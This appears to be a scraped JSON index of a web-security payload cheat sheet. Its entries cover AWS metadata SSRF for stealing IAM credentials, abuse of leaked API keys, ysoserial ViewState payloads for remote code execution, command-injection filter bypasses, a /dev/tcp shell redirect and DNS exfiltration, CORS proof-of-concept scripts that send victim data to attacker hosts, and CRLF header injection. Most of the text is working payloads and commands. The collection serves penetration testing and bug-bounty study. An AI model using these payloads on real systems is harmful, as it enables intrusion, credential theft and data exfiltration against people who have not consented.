us-west-2 Check bucket disk size # Use --no-sign for un-authenticated check.\naws s3 ls s3://\u0026lt;bucketname\u0026gt; --recursive | grep -v -E \u0026#34;(Bucket: |Prefix: |LastWriteTime|^$|--)\u0026#34; | awk \u0026#39;BEGIN {total=0}{total+=$3}END{print total/1024/1024\u0026#34; MB\u0026#34;}\u0026#39; AWS - Extract Backup # $ aws --profile flaws sts get-caller-identity \u0026#34;Account\u0026#34;: \u0026#34;XXXX26262029\u0026#34;, $ aws --profile profile_name ec2 describe-snapshots $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2 \u0026#34;SnapshotId\u0026#34;: \u0026#34;snap-XXXX342abd1bdcb89\u0026#34;, Create a volume using snapshot $ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-XXXX342abd1bdcb89 In Aws Console -\u0026gt; EC2 -\u0026gt; New Ubuntu $ chmod 400 YOUR_KEY.pem $ ssh -i YOUR_KEY.pem ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com Mount the volume $ lsblk $ sudo file -s /dev/xvda1 $ sudo mount /dev/xvda1 /mnt Bucket juicy data # Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :\nhttp://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/\nReferences # There\u0026rsquo;s a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis Bug Bounty Survey - AWS Basic test flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route Guardzilla video camera hardcoded AWS credential - 0dayallday.org AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019 "},{"id":37,"href":"/docs/api_key_leaks/","title":"API Key Leaks","section":"Docs","content":" API Key Leaks # The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.\nTools # KeyFinder - is a tool that let you find keys while surfing the web! Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they\u0026rsquo;re valid. truffleHog - Find credentials all over the place docker run -it -v \u0026#34;$PWD:/pwd\u0026#34; trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys docker run -it -v \u0026#34;$PWD:/pwd\u0026#34; trufflesecurity/trufflehog:latest github --org=trufflesecurity trufflehog git https://github.com/trufflesecurity/trufflehog.git trufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2 Exploit # The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.\nGoogle Maps # Use : https://github.com/ozguralp/gmapsapiscanner/\nUsage:\nName Endpoint Static Maps https://maps.googleapis.com/maps/api/staticmap?center=45%2C10\u0026zoom=7\u0026size=400x400\u0026key=KEY_HERE Streetview https://maps.googleapis.com/maps/api/streetview?size=400x400\u0026location=40.720032,-73.988354\u0026fov=90\u0026heading=235\u0026pitch=10\u0026key=KEY_HERE Embed https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ\u0026key=KEY_HERE Directions https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland\u0026destination=Universal+Studios+Hollywood4\u0026key=KEY_HERE Geocoding https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30\u0026key=KEY_HERE Distance Matrix https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial\u0026origins=40.6655101,-73.89188969999998\u0026destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626\u0026key=KEY_HERE Find Place from Text https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia\u0026inputtype=textquery\u0026fields=photos,formatted_address,name,rating,opening_hours,geometry\u0026key=KEY_HERE Autocomplete https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh\u0026types=%28cities%29\u0026key=KEY_HERE Elevation https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034\u0026key=KEY_HERE Timezone https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510\u0026timestamp=1331161200\u0026key=KEY_HERE Roads https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795 Geolocate https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE Impact:\nConsuming the company\u0026rsquo;s monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account Algolia # curl --request PUT \\ --url https://\u0026lt;application-id\u0026gt;-1.algolianet.com/1/indexes/\u0026lt;example-index\u0026gt;/settings \\ --header \u0026#39;content-type: application/json\u0026#39; \\ --header \u0026#39;x-algolia-api-key: \u0026lt;example-key\u0026gt;\u0026#39; \\ --header \u0026#39;x-algolia-application-id: \u0026lt;example-application-id\u0026gt;\u0026#39; \\ --data \u0026#39;{\u0026#34;highlightPreTag\u0026#34;: \u0026#34;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#34;}\u0026#39; Slack API Token # curl -sX POST \u0026#34;https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE\u0026amp;pretty=1\u0026#34; Facebook Access Token # curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE\u0026amp;version=v3.2 Github client id and client secret # curl \u0026#39;https://api.github.com/users/whatever?client_id=xxxx\u0026amp;client_secret=yyyy\u0026#39; Twilio Account_sid and Auth token # curl -X GET \u0026#39;https://api.twilio.com/2010-04-01/Accounts.json\u0026#39; -u ACCOUNT_SID:AUTH_TOKEN Twitter API Secret # curl -u \u0026#39;API key:API secret key\u0026#39; --data \u0026#39;grant_type=client_credentials\u0026#39; \u0026#39;https://api.twitter.com/oauth2/token\u0026#39; Twitter Bearer Token # curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header \u0026#39;authorization: Bearer TOKEN\u0026#39; Gitlab Personal Access Token # curl \u0026#34;https://gitlab.example.com/api/v4/projects?private_token=\u0026lt;your_access_token\u0026gt;\u0026#34; HockeyApp API Token # curl -H \u0026#34;X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c\u0026#34; https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4 IIS Machine Keys # That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.\nRequirements\nmachineKey validationKey and decryptionKey __VIEWSTATEGENERATOR cookies __VIEWSTATE cookies Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.\n\u0026lt;machineKey validationKey=\u0026#34;87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\u0026#34; decryptionKey=\u0026#34;E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\u0026#34; validation=\u0026#34;SHA1\u0026#34; /\u0026gt; Common locations of web.config / machine.config\n32-bit C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config 64-bit C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config in registry when AutoGenerate is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab) HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4 HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey Identify known machine key # Exploit with Blacklist3r/AspDotNetWrapper Exploit with ViewGen # --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file # -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value $ viewgen --guess \u0026#34;/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\u0026#34; [+] ViewState is not encrypted [+] Signature algorithm: SHA1 # --encrypteddata : __VIEWSTATE parameter value of the target application # --modifier : __VIEWSTATEGENERATOR parameter value $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata \u0026lt;real viewstate value\u0026gt; --purpose=viewstate --modifier=\u0026lt;modifier value\u0026gt; –macdecode Decode ViewState # $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 \u0026#34;zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\u0026#34; $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=CA0B0334 --macdecode $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath \u0026#34;/Savings-and-Investments/Application/ContactDetails.aspx\u0026#34; -f out.txt --IISDirPath=\u0026#34;/\u0026#34; Generate ViewState for RCE # NOTE: Send a POST request with the generated ViewState to the same endpoint, in Burp you should URL Encode Key Characters for your payload.\n$ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \u0026#34;cmd.exe /c nslookup \u0026lt;your collab domain\u0026gt;\u0026#34; --decryptionalg=\u0026#34;AES\u0026#34; --generator=ABABABAB decryptionkey=\u0026#34;\u0026lt;decryption key\u0026gt;\u0026#34; --validationalg=\u0026#34;SHA1\u0026#34; --validationkey=\u0026#34;\u0026lt;validation key\u0026gt;\u0026#34; $ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \u0026#34;echo 123 \u0026gt; c:\\pwn.txt\u0026#34; --generator=\u0026#34;CA0B0334\u0026#34; --validationalg=\u0026#34;MD5\u0026#34; --validationkey=\u0026#34;b07b0f97365416288cf0247cffdf135d25f6be87\u0026#34; $ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \u0026#34;C:\\Users\\zhu\\Desktop\\ExploitClass.cs;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Web.dll\u0026#34; --generator=\u0026#34;CA0B0334\u0026#34; --validationalg=\u0026#34;SHA1\u0026#34; --validationkey=\u0026#34;b07b0f97365416288cf0247cffdf135d25f6be87\u0026#34; $ viewgen --webconfig web.config -m CA0B0334 -c \u0026#34;ping yourdomain.tld\u0026#34; Edit cookies with the machine key # If you have the machineKey but the viewstate is disabled.\nASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools\n# decrypt cookie $ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes # encrypt cookie (edit Decrypted.txt) $ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt Mapbox API Token # A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is sk, jackpot. If it\u0026rsquo;s pk or tk, it\u0026rsquo;s not worth your time.\n#Check token validity curl \u0026#34;https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN\u0026#34; #Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope) curl \u0026#34;https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN\u0026#34; References # Finding Hidden API Keys \u0026amp; How to use them - Sumit Jain - August 24, 2019 Private API key leakage due to lack of access control - yox - August 8, 2018 Project Blacklist3r - November 23, 2018 - @notsosecure Saying Goodbye to my Favorite 5 Minute P1 - Allyson O\u0026rsquo;Malley - January 6, 2020 Mapbox API Token Documentation "},{"id":38,"href":"/docs/command_injection/","title":"Command Injection","section":"Docs","content":" Command Injection # Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.\nTools # commix - Automated All-in-One OS command injection and exploitation tool Exploits # Basic commands # Execute the command and voila :p\ncat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh Chaining commands # original_cmd_by_server; ls original_cmd_by_server \u0026amp;\u0026amp; ls original_cmd_by_server | ls original_cmd_by_server || ls # Only if the first cmd fail Inside a command # original_cmd_by_server `cat /etc/passwd` original_cmd_by_server $(cat /etc/passwd) Filter Bypasses # Bypass without space # Works on Linux only.\nswissky@crashlab:~/Www$ cat\u0026lt;/etc/passwd root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ {cat,/etc/passwd} root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ cat$IFS/etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ echo${IFS}\u0026#34;RCE\u0026#34;${IFS}\u0026amp;\u0026amp;cat${IFS}/etc/passwd RCE root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin swissky@crashlab:~$ X=$\u0026#39;uname\\x20-a\u0026#39;\u0026amp;\u0026amp;$X Linux crashlab 4.4.X-XX-generic #72-Ubuntu swissky@crashlab:~$ sh\u0026lt;/dev/tcp/127.0.0.1/4242 Commands execution without spaces, $ or { } - Linux (Bash only)\nIFS=,;`cat\u0026lt;\u0026lt;\u0026lt;uname,-a` Tabs work as separators in web apps where spaces are removed.\n;ls%09-al%09/home drwxr-xr-x 4 root root 4096 Jan 10 13:34 . drwxr-xr-x 18 root root 4096 Jan 10 13:33 .. drwx------ 2 root root 16384 Jan 10 13:31 lost+found drwxr-xr-x 4 test test 4096 Jan 13 08:30 test Works on Windows only.\nping%CommonProgramFiles:~10,-18%IP ping%PROGRAMFILES:~10,-5%IP Bypass with a line return # something%0Acat%20/etc/passwd You can also write files.\n;cat\u0026gt;/tmp/hi\u0026lt;\u0026lt;EOF%0ahello%0aEOF ;cat\u0026lt;/tmp/hi hello Bypass characters filter via hex encoding # Linux\nswissky@crashlab:~$ echo -e \u0026#34;\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\u0026#34; /etc/passwd swissky@crashlab:~$ cat `echo -e \u0026#34;\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\u0026#34;` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ abc=$\u0026#39;\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\u0026#39;;cat $abc root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ `echo $\u0026#39;cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\u0026#39;` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ xxd -r -p \u0026lt;\u0026lt;\u0026lt; 2f6574632f706173737764 /etc/passwd swissky@crashlab:~$ cat `xxd -r -p \u0026lt;\u0026lt;\u0026lt; 2f6574632f706173737764` root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ xxd -r -ps \u0026lt;(echo 2f6574632f706173737764) /etc/passwd swissky@crashlab:~$ cat `xxd -r -ps \u0026lt;(echo 2f6574632f706173737764)` root:x:0:0:root:/root:/bin/bash Bypass characters filter # Commands execution without backslash and slash - linux bash\nswissky@crashlab:~$ echo ${HOME:0:1} / swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd root:x:0:0:root:/root:/bin/bash swissky@crashlab:~$ echo . | tr \u0026#39;!-0\u0026#39; \u0026#39;\u0026#34;-1\u0026#39; / swissky@crashlab:~$ tr \u0026#39;!-0\u0026#39; \u0026#39;\u0026#34;-1\u0026#39; \u0026lt;\u0026lt;\u0026lt; . / swissky@crashlab:~$ cat $(echo . | tr \u0026#39;!-0\u0026#39; \u0026#39;\u0026#34;-1\u0026#39;)etc$(echo . | tr \u0026#39;!-0\u0026#39; \u0026#39;\u0026#34;-1\u0026#39;)passwd root:x:0:0:root:/root:/bin/bash Bypass Blacklisted words # Bypass with single quote # w\u0026#39;h\u0026#39;o\u0026#39;am\u0026#39;i Bypass with double quote # w\u0026#34;h\u0026#34;o\u0026#34;am\u0026#34;i Bypass with backslash and slash # w\\ho\\am\\i /\\b\\i\\n/////s\\h Bypass with $@ # who$@ami echo $0 -\u0026gt; /usr/bin/zsh echo whoami|$0 Bypass with $() # who$()ami who$(echo am)i who`echo am`i Bypass with variable expansion # /???/??t /???/p??s?? test=/ehhh/hmtc/pahhh/hmsswd cat ${test//hhh\\/hm/} cat ${test//hh??hm/} Bypass with wildcards # powershell C:\\*\\*2\\n??e*d.*? # notepad @^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc Challenge # Challenge based on the previous tricks, what does the following command do:\ng=\u0026#34;/e\u0026#34;\\h\u0026#34;hh\u0026#34;/hm\u0026#34;t\u0026#34;c/\\i\u0026#34;sh\u0026#34;hh/hmsu\\e;tac$@\u0026lt;${g//hh??hm/} Time based data exfiltration # Extracting data : char by char\nswissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi real 0m5.007s user 0m0.000s sys 0m0.000s swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi real 0m0.002s user 0m0.000s sys 0m0.000s DNS based data exfiltration # Based on the tool from https://github.com/HoLyVieR/dnsbin also hosted at dnsbin.zhack.ca\n1. Go to http://dnsbin.zhack.ca/ 2. Execute a simple \u0026#39;ls\u0026#39; for i in $(ls /) ; do host \u0026#34;$i.3a43c7e4e57a8d0e2057.d.zhack.ca\u0026#34;; done $(host $(wget -h|head -n1|sed \u0026#39;s/[ ,]/-/g\u0026#39;|tr -d \u0026#39;.\u0026#39;).sudo.co.il) Online tools to check for DNS based data exfiltration:\ndnsbin.zhack.ca pingb.in Polyglot command injection # 1;sleep${IFS}9;#${IFS}\u0026#39;;sleep${IFS}9;#${IFS}\u0026#34;;sleep${IFS}9;#${IFS} e.g: echo 1;sleep${IFS}9;#${IFS}\u0026#39;;sleep${IFS}9;#${IFS}\u0026#34;;sleep${IFS}9;#${IFS} echo \u0026#39;1;sleep${IFS}9;#${IFS}\u0026#39;;sleep${IFS}9;#${IFS}\u0026#34;;sleep${IFS}9;#${IFS} echo \u0026#34;1;sleep${IFS}9;#${IFS}\u0026#39;;sleep${IFS}9;#${IFS}\u0026#34;;sleep${IFS}9;#${IFS} /*$(sleep 5)`sleep 5``*/-sleep(5)-\u0026#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||\u0026#39;\u0026#34;||sleep(5)||\u0026#34;/*`*/ e.g: echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-\u0026#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||\u0026#39;\u0026#34;||sleep(5)||\u0026#34;/*`*/ echo \u0026#34;YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-\u0026#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||\u0026#39;\u0026#34;||sleep(5)||\u0026#34;/*`*/\u0026#34; echo \u0026#39;YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-\u0026#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||\u0026#39;\u0026#34;||sleep(5)||\u0026#34;/*`*/\u0026#39; References # SECURITY CAFÉ - Exploiting Timed Based RCE Bug Bounty Survey - Windows RCE spaceless No PHP, no spaces, no $, no { }, bash only - @asdizzle #bash #obfuscation by string manipulation - Malwrologist, @DissectMalware "},{"id":39,"href":"/docs/cors_misconfigurations/","title":"CORS Misconfigurations","section":"Docs","content":" CORS Misconfiguration # A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials.\nTools # Corsy - CORS Misconfiguration Scanner PostMessage POC Builder - @honoki Prerequisites # BURP HEADER\u0026gt; Origin: https://evil.com VICTIM HEADER\u0026gt; Access-Control-Allow-Credential: true VICTIM HEADER\u0026gt; Access-Control-Allow-Origin: https://evil.com OR Access-Control-Allow-Origin: null Exploitation # Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target https://victim.example.com/endpoint.\nVulnerable Example: Origin Reflection # Vulnerable Implementation # GET /endpoint HTTP/1.1 Host: victim.example.com Origin: https://evil.com Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true {\u0026#34;[private API key]\u0026#34;} Proof of concept # This PoC requires that the respective JS script is hosted at evil.com\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;https://victim.example.com/endpoint\u0026#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=\u0026#39;//atttacker.net/log?key=\u0026#39;+this.responseText; }; or\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;CORS PoC\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;demo\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;cors()\u0026#34;\u0026gt;Exploit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; function cors() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (this.readyState == 4 \u0026amp;\u0026amp; this.status == 200) { document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = alert(this.responseText); } }; xhr.open(\u0026#34;GET\u0026#34;, \u0026#34;https://victim.example.com/endpoint\u0026#34;, true); xhr.withCredentials = true; xhr.send(); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Vulnerable Example: Null Origin # Vulnerable Implementation # It\u0026rsquo;s possible that the server does not reflect the complete Origin header but that the null origin is allowed. This would look like this in the server\u0026rsquo;s response:\nGET /endpoint HTTP/1.1 Host: victim.example.com Origin: null Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true {\u0026#34;[private API key]\u0026#34;} Proof of concept # This can be exploited by putting the attack code into an iframe using the data URI scheme. If the data URI scheme is used, the browser will use the null origin in the request:\n\u0026lt;iframe sandbox=\u0026#34;allow-scripts allow-top-navigation allow-forms\u0026#34; src=\u0026#34;data:text/html, \u0026lt;script\u0026gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;https://victim.example.com/endpoint\u0026#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=\u0026#39;https://attacker.example.net/log?key=\u0026#39;+encodeURIComponent(this.responseText); }; \u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; Vulnerable Example: XSS on Trusted Origin # If the application does implement a strict whitelist of allowed origins, the exploit codes from above do not work. But if you have an XSS on a trusted origin, you can inject the exploit coded from above in order to exploit CORS again.\nhttps://trusted-origin.example.com/?xss=\u0026lt;script\u0026gt;CORS-ATTACK-PAYLOAD\u0026lt;/script\u0026gt; Vulnerable Example: Wildcard Origin * without Credentials # If the server responds with a wildcard origin *, the browser does never send the cookies. However, if the server does not require authentication, it\u0026rsquo;s still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker\u0026rsquo;s website can then pivot into the internal network and access the server\u0026rsquo;s data without authentication.\n* is the only wildcard origin https://*.example.com is not valid Vulnerable Implementation # GET /endpoint HTTP/1.1 Host: api.internal.example.com Origin: https://evil.com HTTP/1.1 200 OK Access-Control-Allow-Origin: * {\u0026#34;[private API key]\u0026#34;} Proof of concept # var req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;https://api.internal.example.com/endpoint\u0026#39;,true); req.send(); function reqListener() { location=\u0026#39;//atttacker.net/log?key=\u0026#39;+this.responseText; }; Vulnerable Example: Expanding the Origin / Regex Issues # Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.\nVulnerable Implementation (Example 1) # In this scenario any prefix inserted in front of example.com will be accepted by the server.\nGET /endpoint HTTP/1.1 Host: api.example.com Origin: https://evilexample.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evilexample.com Access-Control-Allow-Credentials: true {\u0026#34;[private API key]\u0026#34;} Proof of concept (Example 1) # This PoC requires the respective JS script to be hosted at evilexample.com\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;https://api.example.com/endpoint\u0026#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=\u0026#39;//atttacker.net/log?key=\u0026#39;+this.responseText; }; Vulnerable Implementation (Example 2) # In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: ^api.example.com$ instead of ^api\\.example.com$. Thus, the dot can be replaced with any letter to gain access from a third-party domain.\nGET /endpoint HTTP/1.1 Host: api.example.com Origin: https://apiiexample.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://apiiexample.com Access-Control-Allow-Credentials: true {\u0026#34;[private API key]\u0026#34;} Proof of concept (Example 2) # This PoC requires the respective JS script to be hosted at apiiexample.com\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;https://api.example.com/endpoint\u0026#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=\u0026#39;//atttacker.net/log?key=\u0026#39;+this.responseText; }; Bug Bounty reports # CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg) Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) [██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) References # Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019 Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016 Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016 Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018 PortSwigger Web Security Academy: CORS CORS Misconfigurations Explained - Detectify Blog "},{"id":40,"href":"/docs/crlf_injection/","title":"CRLF Injection","section":"Docs","content":" CRLF Injection # The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). They\u0026rsquo;re used to note the termination of a line, however, dealt with differently in today’s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.\nA CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.\nSummary # CRLF - Add a cookie CRLF - Add a cookie - XSS Bypass CRLF - Write HTML CRLF - Filter Bypass References CRLF - Add a cookie # Requested page\nhttp://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue HTTP Response\nConnection: keep-alive Content-Length: 178 Content-Type: text/html Date: Mon, 09 May 2016 14:47:29 GMT Location: https://www.example.net/[INJECTION STARTS HERE] Set-Cookie: mycookie=myvalue X-Frame-Options: SAMEORIGIN X-Sucuri-ID: 15016 x-content-type-options: nosniff x-xss-protection: 1; mode=block CRLF - Add a cookie - XSS Bypass # Requested page\nhttp://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a\u0026lt;svg%20onload=alert(document.domain)\u0026gt;%0d%0a0%0d%0a/%2f%2e%2e HTTP Response\nHTTP/1.1 200 OK Date: Tue, 20 Dec 2016 14:34:03 GMT Content-Type: text/html; charset=utf-8 Content-Length: 22907 Connection: close X-Frame-Options: SAMEORIGIN Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT ETag: 